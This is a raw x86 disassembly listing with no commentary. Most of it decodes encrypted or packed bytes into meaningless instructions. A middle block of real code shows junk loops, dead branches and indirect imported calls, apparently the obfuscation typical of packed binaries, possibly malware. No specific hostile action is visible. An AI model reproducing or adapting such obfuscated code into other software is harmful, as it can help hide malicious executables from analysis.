  40f0bf:	jge    0x40f0ef
  40f0c1:	or     ebp,0x19a218
  40f0c7:	dec    ebx
  40f0c8:	arpl   WORD PTR [edi],cx
  40f0ca:	mov    ch,0xa6
  40f0cc:	repz aam 0x6e
  40f0cf:	pop    ds
  40f0d0:	hlt    
  40f0d1:	je     0x40f0a4
  40f0d3:	in     eax,0x9a
  40f0d5:	add    eax,0x48773cac
  40f0da:	ja     0x40f09c
  40f0dc:	int3   
  40f0dd:	xor    eax,0x55e67868
  40f0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e3:	mov    ah,al
  40f0e5:	ins    BYTE PTR es:[edi],dx
  40f0e6:	dec    edi
  40f0e7:	or     al,0xb5
  40f0e9:	inc    ecx
  40f0ea:	pusha  
  40f0eb:	adc    cl,BYTE PTR [eax-0x5b]
  40f0ee:	dec    esp
  40f0ef:	xchg   BYTE PTR [edi],ah
  40f0f1:	ds jmp 0x6605:0x16fbd567
  40f0f9:	out    0xb3,eax
  40f0fb:	xor    ch,ch
  40f0fd:	xchg   ecx,eax
  40f0fe:	mov    ebx,0xa40756f7
  40f103:	adc    eax,edi
  40f105:	ror    DWORD PTR [eax],1
  40f107:	push   esp
  40f108:	gs adc eax,0xbb18db21
  40f10e:	lods   eax,DWORD PTR ds:[esi]
  40f10f:	push   ecx
  40f110:	mov    al,ds:0xf62285d0
  40f115:	nop
  40f116:	inc    DWORD PTR [ebx+0x6f]
  40f119:	call   0x9f5c:0x275da681
  40f120:	sbb    al,0x9b
  40f122:	push   es
  40f123:	in     eax,0x8a
  40f125:	lahf   
  40f126:	inc    ebx
  40f127:	mov    cl,0xca
  40f129:	xor    BYTE PTR [eax+ebp*1],dl
  40f12c:	ins    DWORD PTR es:[edi],dx
  40f12d:	mov    ds:0xe8b55689,al
  40f132:	mov    ebx,DWORD PTR [edx+edx*1+0x4525e9a1]
  40f139:	jns    0x40f133
  40f13b:	pop    esi
  40f13c:	(bad)  
  40f13d:	loopne 0x40f0d8
  40f13f:	cs inc eax
  40f141:	push   ecx
  40f142:	push   0x62c282f9
  40f147:	mov    ch,0x58
  40f14a:	imul   ebx,DWORD PTR ds:0x6e3ab760,0x55
  40f151:	loopne 0x40f12f
  40f153:	pop    ebp
  40f154:	xor    bh,dh
  40f156:	fmul   st,st(1)
  40f158:	push   edi
  40f159:	push   0xffffff9b
  40f15b:	or     esi,edx
  40f15d:	idiv   DWORD PTR [eax-0xf]
  40f160:	jmp    0x40f110
  40f162:	xor    al,0x1a
  40f164:	clc    
  40f165:	inc    esp
  40f166:	sahf   
  40f167:	xchg   ebx,eax
  40f168:	and    bl,bh
  40f16a:	fiadd  WORD PTR [ecx+0x53]
  40f16d:	ds xchg esi,eax
  40f16f:	out    0xf5,eax
  40f171:	xchg   ebx,eax
  40f172:	sti    
  40f173:	shl    DWORD PTR [ebx+eiz*1],1
  40f176:	test   eax,0xb2c37e71
  40f17b:	sbb    ebx,eax
  40f17d:	mov    al,0xd8
  40f17f:	(bad)  [ebp+0x7068d9a8]
  40f185:	jl     0x40f13c
  40f187:	xchg   ebp,eax
  40f188:	clc    
  40f189:	or     al,0x4
  40f18b:	adc    eax,0xdb5db249
  40f190:	mov    bh,0xc1
  40f192:	push   ecx
  40f193:	ins    DWORD PTR es:[edi],dx
  40f194:	sub    cl,BYTE PTR [ecx]
  40f196:	add    ch,dl
  40f198:	and    eax,0xc8839b9d
  40f19d:	mov    eax,0x9a154051
  40f1a2:	push   esp
  40f1a3:	xchg   ecx,eax
  40f1a4:	inc    ecx
  40f1a5:	xchg   ebp,eax
  40f1a6:	sbb    esi,DWORD PTR [ebx+esi*2+0x45160091]
  40f1ad:	mov    esi,0x69ebf245
  40f1b2:	mov    ds:0x76c10129,eax
  40f1b7:	sub    edi,DWORD PTR [ebx-0x6]
  40f1ba:	inc    eax
  40f1bb:	jnp    0x40f1b5
  40f1bd:	sahf   
  40f1be:	sbb    ch,ch
  40f1c0:	jae    0x40f1a2
  40f1c2:	iret   
  40f1c3:	and    cl,dh
  40f1c5:	mov    edx,0x99cc9f75
  40f1ca:	pop    edi
  40f1cb:	mov    edx,0xd0af7f2c
  40f1d0:	les    eax,FWORD PTR [edx]
  40f1d2:	push   ds
  40f1d3:	fisub  WORD PTR [esi+0x25]
  40f1d6:	sbb    esp,ecx
  40f1d8:	mov    al,0x3e
  40f1da:	fwait
  40f1db:	js     0x40f22a
  40f1dd:	mov    ds:0xa0975b0b,al
  40f1e2:	iret   
  40f1e3:	or     eax,0x4ec5c2fd
  40f1e8:	push   edi
  40f1e9:	cld    
  40f1ea:	js     0x40f253
  40f1ec:	aaa    
  40f1ed:	or     dh,BYTE PTR [ecx+ebp*1+0x2d]
  40f1f1:	add    ch,BYTE PTR [ebp-0x64]
  40f1f4:	gs cli 
  40f1f6:	les    ecx,FWORD PTR [edi+0x4a]
  40f1f9:	imul   edx,DWORD PTR [edx],0x69fd1815
  40f1ff:	mov    edi,0xe2f109f5
  40f204:	inc    ebp
  40f205:	sbb    dh,ah
  40f207:	test   al,0x2c
  40f209:	dec    esp
  40f20a:	daa    
  40f20b:	or     BYTE PTR cs:[ebx-0x169e4b91],dl
  40f212:	cdq    
  40f213:	mov    dh,0x8b
  40f215:	pop    edi
  40f216:	push   cs
  40f217:	(bad)  
  40f218:	pop    eax
  40f219:	xor    BYTE PTR [ecx-0x2786fa16],bh
  40f21f:	xchg   ebp,eax
  40f220:	jo     0x40f1f4
  40f222:	xchg   edx,eax
  40f223:	in     eax,dx
  40f224:	jnp    0x40f1a9
  40f226:	xlat   BYTE PTR ds:[ebx]
  40f227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f229:	ss and esp,edx
  40f22c:	mov    bh,0x5e
  40f22e:	dec    edi
  40f22f:	sub    esp,DWORD PTR [edx-0x742f4560]
  40f235:	adc    DWORD PTR [ecx],ebx
  40f237:	xchg   edi,eax
  40f238:	inc    ecx
  40f239:	adc    eax,0xa578c36a
  40f23e:	clc    
  40f23f:	jo     0x40f28b
  40f241:	leave  
  40f242:	loop   0x40f246
  40f244:	add    bl,dl
  40f246:	fsub   st,st(2)
  40f248:	mov    dl,0x2
  40f24a:	ret    
  40f24b:	push   ss
  40f24c:	xor    al,0xa3
  40f24e:	fild   DWORD PTR [edi+0x4fdea345]
  40f254:	add    ch,BYTE PTR [ecx+ebx*8-0x48]
  40f258:	scas   eax,DWORD PTR es:[edi]
  40f259:	fcomp  st(2)
  40f25b:	sbb    BYTE PTR [edx],al
  40f25d:	jle    0x40f214
  40f25f:	dec    esi
  40f260:	stos   DWORD PTR es:[edi],eax
  40f261:	call   0x4f14:0x230d17e1
  40f268:	shl    DWORD PTR [esi-0x57],cl
  40f26b:	cld    
  40f26c:	stos   DWORD PTR es:[edi],eax
  40f26d:	stos   DWORD PTR es:[edi],eax
  40f26e:	(bad)  
  40f26f:	jmp    0x40f2c9
  40f271:	in     eax,dx
  40f272:	push   ss
  40f273:	pop    ds
  40f274:	icebp  
  40f275:	sub    eax,0x2f51b804
  40f27a:	pop    ss
  40f27b:	and    ax,0x48b1
  40f27f:	sahf   
  40f280:	inc    eax
  40f281:	mov    WORD PTR [esi+0x36],?
  40f284:	add    eax,0x9f32c0c0
  40f289:	sbb    BYTE PTR [edx+0x1d],bh
  40f28c:	lock ja 0x40f2e0
  40f28f:	cmp    eax,0xbb80ea86
  40f294:	es push 0xa9e5d2bf
  40f29a:	dec    esi
  40f29b:	or     BYTE PTR [edx+0x30a5f9d8],0x80
  40f2a2:	cmp    eax,0x534ad51f
  40f2a7:	adc    ebp,DWORD PTR [eax]
  40f2a9:	push   0x2f
  40f2ab:	mov    ecx,0xe2e1836a
  40f2b0:	sbb    esp,esi
  40f2b2:	ja     0x40f2a4
  40f2b4:	ins    BYTE PTR es:[edi],dx
  40f2b5:	clc    
  40f2b6:	inc    ebx
  40f2b7:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f2b9:	in     eax,dx
  40f2ba:	push   ebp
  40f2bb:	or     BYTE PTR [esi-0x2ad98acf],dl
  40f2c1:	lods   al,BYTE PTR ds:[esi]
  40f2c2:	sub    al,0xde
  40f2c4:	icebp  
  40f2c5:	test   eax,0x37229e44
  40f2ca:	sub    cl,BYTE PTR [esi-0x708e79f7]
  40f2d0:	push   ebp
  40f2d1:	adc    eax,0x97afb75
  40f2d6:	jns    0x40f2aa
  40f2d8:	mov    al,0x17
  40f2da:	adc    ch,BYTE PTR [eax-0xd]
  40f2dd:	in     al,dx
  40f2de:	xchg   ecx,eax
  40f2df:	dec    esi
  40f2e0:	pop    edi
  40f2e1:	in     al,0xa0
  40f2e3:	int3   
  40f2e4:	(bad)  
  40f2e5:	fistp  DWORD PTR [edi+ecx*2+0x25ea0364]
  40f2ec:	in     al,dx
  40f2ed:	loopne 0x40f315
  40f2ef:	push   cs
  40f2f0:	add    eax,0x138e8e09
  40f2f5:	cwde   
  40f2f6:	(bad)  
  40f2f7:	icebp  
  40f2f8:	cld    
  40f2f9:	stos   DWORD PTR es:[edi],eax
  40f2fa:	xor    al,0xbe
  40f2fc:	cli    
  40f2fd:	push   0xf1b661b
  40f302:	gs retf 0x76ac
  40f306:	sbb    ebx,DWORD PTR [ebp-0x5a]
  40f309:	loopne 0x40f29e
  40f30b:	int3   
  40f30c:	push   esi
  40f30d:	inc    ebp
  40f30e:	jl     0x40f2ef
  40f310:	into   
  40f311:	add    BYTE PTR [esp+esi*2+0x47],0x19
  40f316:	mov    esp,0x78552763
  40f31b:	pop    ecx
  40f31c:	and    al,0x91
  40f31e:	or     bl,BYTE PTR [ebx+edx*1+0x4b]
  40f322:	add    dl,BYTE PTR [ebx+0xd]
  40f325:	pop    edi
  40f326:	aam    0xe3
  40f328:	xchg   BYTE PTR [esi+edx*4-0x53],ch
  40f32c:	dec    eax
  40f32d:	scas   eax,DWORD PTR es:[edi]
  40f32e:	inc    ebx
  40f32f:	xor    edi,eax
  40f331:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40f333:	iret   
  40f334:	lock jp 0x40f35d
  40f337:	xor    eax,0x9641aabf
  40f33c:	scas   al,BYTE PTR es:[edi]
  40f33d:	xor    DWORD PTR [edx-0x72],edx
  40f340:	jns    0x40f2e8
  40f342:	sar    DWORD PTR ds:0x96987f8c,1
  40f348:	adc    DWORD PTR [ebx+0x3055336c],esi
  40f34e:	jb     0x40f33f
  40f350:	inc    ebp
  40f351:	inc    ebx
  40f352:	sbb    BYTE PTR [ebx],al
  40f354:	xlat   BYTE PTR ds:[ebx]
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	adc    al,0x72
  40f709:	adc    eax,0x7ccddc2a
  40f70e:	jl     0x40f6fb
  40f710:	pop    edi
  40f711:	jl     0x40f78f
  40f713:	adc    bl,dh
  40f715:	adc    ebp,eax
  40f717:	nop
  40f718:	xor    BYTE PTR [ecx],dl
  40f71a:	imul   esi,DWORD PTR [ebx-0x6b],0xe537ff4f
  40f721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f722:	es cld 
  40f724:	rcr    BYTE PTR [edi+eiz*4],0x68
  40f728:	jmp    0x40f726
  40f72a:	mov    es,WORD PTR [edx+0x51]
  40f72d:	dec    edx
  40f72e:	fdivr  DWORD PTR [ecx+0x5a]
  40f731:	(bad)  
  40f732:	js     0x40f750
  40f734:	popa   
  40f735:	fdivp  st(0),st
  40f737:	mov    ebx,esp
  40f739:	sar    DWORD PTR [edx],0xde
  40f73c:	or     bh,BYTE PTR [eax]
  40f73e:	xchg   edx,eax
  40f73f:	pop    edi
  40f740:	dec    edx
  40f741:	fwait
  40f742:	pop    es
  40f743:	mov    dh,0x43
  40f745:	pusha  
  40f746:	adc    edi,DWORD PTR [eax+0x7e]
  40f749:	xchg   esp,eax
  40f74a:	lahf   
  40f74b:	fadd   DWORD PTR ds:0xcef6e983
  40f751:	xchg   ebp,eax
  40f752:	inc    ecx
  40f753:	or     al,0xd
  40f755:	ss js  0x40f79b
  40f758:	pop    esp
  40f759:	dec    esi
  40f75a:	pop    ebp
  40f75b:	repnz push es
  40f75d:	aad    0xba
  40f75f:	mov    esp,0x5bb8810d
  40f764:	aas    
  40f765:	das    
  40f766:	push   edi
  40f767:	lahf   
  40f768:	stc    
  40f769:	add    eax,DWORD PTR [ebx+0x69]
  40f76c:	out    dx,al
  40f76d:	push   ds
  40f76e:	inc    edx
  40f76f:	jg     0x40f76a
  40f771:	test   al,0x1
  40f773:	(bad)  
  40f774:	pushf  
  40f775:	xor    eax,0x7aca9e7f
  40f77a:	sbb    DWORD PTR [eax],ecx
  40f77c:	test   cl,cl
  40f77e:	push   ds
  40f77f:	add    cl,BYTE PTR [esi]
  40f781:	cmp    al,0x34
  40f783:	arpl   di,bp
  40f785:	stc    
  40f786:	inc    edi
  40f787:	test   eax,0xce970108
  40f78c:	sub    DWORD PTR [ecx],ebp
  40f78e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f78f:	(bad)  
  40f791:	or     BYTE PTR [edx+0x7ef54fcf],dl
  40f797:	jecxz  0x40f800
  40f799:	or     esp,DWORD PTR [ecx+0x22d50374]
  40f79f:	mov    ds:0x60a95ce6,al
  40f7a4:	je     0x40f72b
  40f7a6:	dec    edi
  40f7a7:	mov    ah,0xdc
  40f7a9:	jp     0x40f7a1
  40f7ab:	mov    BYTE PTR [ebp-0x59],dl
  40f7ae:	add    ah,dl
  40f7b0:	cmp    edx,esp
  40f7b2:	and    eax,0xc8149f22
  40f7b7:	jnp    0x40f803
  40f7b9:	pop    ds
  40f7ba:	pushf  
  40f7bb:	sbb    al,0x4b
  40f7bd:	dec    ecx
  40f7be:	jnp    0x40f7b3
  40f7c0:	jl     0x40f803
  40f7c2:	sahf   
  40f7c3:	pop    eax
  40f7c4:	daa    
  40f7c5:	in     al,0xff
  40f7c7:	in     eax,dx
  40f7c8:	repz mov al,gs:0xf85311b2
  40f7cf:	sub    BYTE PTR [esi+ebx*2],dh
  40f7d2:	xchg   BYTE PTR [edi-0x45],ah
  40f7d5:	push   ss
  40f7d6:	cli    
  40f7d7:	pusha  
  40f7d8:	xchg   ecx,eax
  40f7d9:	mov    ds:0xb5ee84b6,al
  40f7de:	xchg   ebp,eax
  40f7df:	add    edi,ebp
  40f7e1:	mov    cl,0x47
  40f7e3:	xor    al,0x69
  40f7e5:	ja     0x40f830
  40f7e7:	dec    ebx
  40f7e8:	jno    0x40f76e
  40f7ea:	pop    eax
  40f7eb:	mov    ebp,DWORD PTR [edi+0x2a]
  40f7ee:	pop    ds
  40f7ef:	mov    ch,0xa3
  40f7f1:	cmp    DWORD PTR [eax+0x503ccf1e],ebp
  40f7f7:	mov    ds:0x69a777d8,al
  40f7fc:	nop
  40f7fd:	fmulp  st(7),st
  40f7ff:	adc    al,0x36
  40f801:	stc    
  40f802:	fisubr WORD PTR [esi+ebx*2-0x53]
  40f806:	shl    DWORD PTR [edx],0x9
  40f809:	cld    
  40f80a:	cs inc eax
  40f80c:	aad    0xa8
  40f80e:	and    ebx,DWORD PTR [edx+ebp*8+0x1f723d8c]
  40f815:	aas    
  40f816:	mov    esp,0xd0d665c
  40f81b:	jp     0x40f7cd
  40f81d:	mov    edx,0xb7fbe089
  40f822:	ror    DWORD PTR ds:0x913dcdae,cl
  40f828:	popf   
  40f829:	mov    ds:0xb8c4d448,eax
  40f82e:	xchg   edi,esp
  40f830:	repnz stos DWORD PTR es:[edi],eax
  40f832:	or     BYTE PTR [ecx-0x41],dl
  40f835:	push   ebx
  40f836:	sbb    esp,DWORD PTR [esi+0x35]
  40f839:	ds xchg ebp,eax
  40f83b:	test   eax,0x30ce1c5f
  40f840:	pushf  
  40f841:	dec    BYTE PTR [esi+0x4a]
  40f844:	jmp    0x630c85ff
  40f849:	xor    BYTE PTR [esp+edi*4-0x50977a14],dh
  40f850:	sbb    BYTE PTR [edi-0x4c],ah
  40f853:	rcr    DWORD PTR ds:0x792f93dc,0xc5
  40f85a:	jne    0x40f897
  40f85c:	add    dl,dl
  40f85e:	jp     0x40f8cc
  40f860:	test   BYTE PTR [ebp-0x38],cl
  40f863:	adc    eax,0x28ee4f7c
  40f868:	rcr    DWORD PTR [esi+0x3a],cl
  40f86b:	ror    DWORD PTR [edx],0x7a
  40f86e:	mov    ds:0x5b54b75d,eax
  40f873:	cli    
  40f874:	push   0x44fae617
  40f879:	pop    eax
  40f87a:	mov    bh,0xbf
  40f87c:	fld    st(4)
  40f87e:	jp     0x40f892
  40f880:	sbb    al,0x3a
  40f882:	add    al,0xf0
  40f884:	mov    ah,0x8c
  40f886:	das    
  40f887:	cmp    DWORD PTR [edx+0x2e77b381],esi
  40f88d:	sub    DWORD PTR [edi],edx
  40f88f:	push   es
  40f890:	mov    bh,0x20
  40f892:	in     al,0x46
  40f894:	icebp  
  40f895:	jb     0x40f874
  40f897:	ss push ebp
  40f899:	mov    al,ds:0xb7bda3d8
  40f89e:	push   esi
  40f89f:	and    al,BYTE PTR [ebx+0x62890254]
  40f8a5:	xchg   esi,eax
  40f8a6:	jmp    0x8de2fe3f
  40f8ab:	adc    ch,bl
  40f8ad:	sti    
  40f8ae:	mov    cl,0x9d
  40f8b0:	pop    ds
  40f8b1:	sbb    eax,0x3fd1ce83
  40f8b6:	cli    
  40f8b7:	push   0xffffffd8
  40f8b9:	je     0x40f875
  40f8bb:	push   ebp
  40f8bc:	in     eax,dx
  40f8bd:	and    eax,0xebbb5521
  40f8c2:	aaa    
  40f8c3:	(bad)  
  40f8c4:	in     al,dx
  40f8c5:	mov    bl,ch
  40f8c7:	imul   ebx,DWORD PTR [ebp+0x4c],0x4c
  40f8cb:	inc    ebp
  40f8cc:	icebp  
  40f8cd:	fprem1 
  40f8cf:	pop    ss
  40f8d0:	mov    ebp,0xbe7d98ff
  40f8d5:	mov    bh,0xe7
  40f8d7:	test   al,0x49
  40f8d9:	dec    ecx
  40f8da:	fidiv  DWORD PTR [ebp+0x12]
  40f8dd:	pop    esi
  40f8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8df:	ror    BYTE PTR [eax],0x7a
  40f8e2:	push   esi
  40f8e3:	mov    fs,eax
  40f8e5:	mov    bh,0x18
  40f8e7:	and    dh,BYTE PTR [edx+eax*4]
  40f8ea:	add    bl,BYTE PTR [ecx-0x2b]
  40f8ed:	cmp    esi,esi
  40f8ef:	mov    ds,WORD PTR [esi]
  40f8f1:	xor    BYTE PTR [edi+0x6],ch
  40f8f4:	ins    DWORD PTR es:[edi],dx
  40f8f5:	xchg   esp,eax
  40f8f6:	and    ah,BYTE PTR [esi-0x1021702c]
  40f8fc:	add    al,0xbe
  40f8fe:	loopne 0x40f8eb
  40f900:	dec    ebx
  40f901:	xchg   esi,eax
  40f902:	sub    DWORD PTR [edx+0x31d4fa65],0xd0c7eb31
  40f90c:	iret   
  40f90d:	mov    esp,0x295e8847
  40f912:	cmp    al,0xeb
  40f914:	mov    ch,0xed
  40f916:	aad    0x3b
  40f918:	call   ebp
  40f91a:	mov    bh,0x35
  40f91c:	mov    edx,0x4550488c
  40f921:	jo     0x40f8e3
  40f923:	leave  
  40f924:	mov    esi,0xccb5bfda
  40f929:	mov    ecx,0x57b5e695
  40f92e:	inc    edi
  40f92f:	or     esi,DWORD PTR [ebp-0x75]
  40f932:	scas   al,BYTE PTR es:[edi]
  40f933:	sbb    esi,DWORD PTR [eax+eax*8-0x73]
  40f937:	sbb    BYTE PTR [eax+edx*8],dl
  40f93a:	test   al,0x97
  40f93c:	push   esp
  40f93d:	xchg   esi,eax
  40f93e:	xchg   ecx,eax
  40f93f:	fist   WORD PTR [edx-0x3e]
  40f942:	jmp    0xaa113d5f
  40f947:	push   0x99d6f2c8
  40f94c:	popa   
  40f94d:	popw   es
  40f94f:	push   edx
  40f950:	adc    dl,cl
  40f952:	out    dx,eax
  40f953:	add    BYTE PTR [ecx+0x1f],cl
  40f956:	sub    DWORD PTR [esi+0x77babff2],ebp
  40f95c:	(bad)  
  40f960:	loop   0x40f99d
  40f962:	push   eax
  40f963:	xchg   edx,eax
  40f964:	fistp  WORD PTR [esi]
  40f966:	(bad)  
  40f967:	das    
  40f968:	fsub   QWORD PTR [edi-0x2f80db6f]
  40f96e:	bound  edi,QWORD PTR [edi]
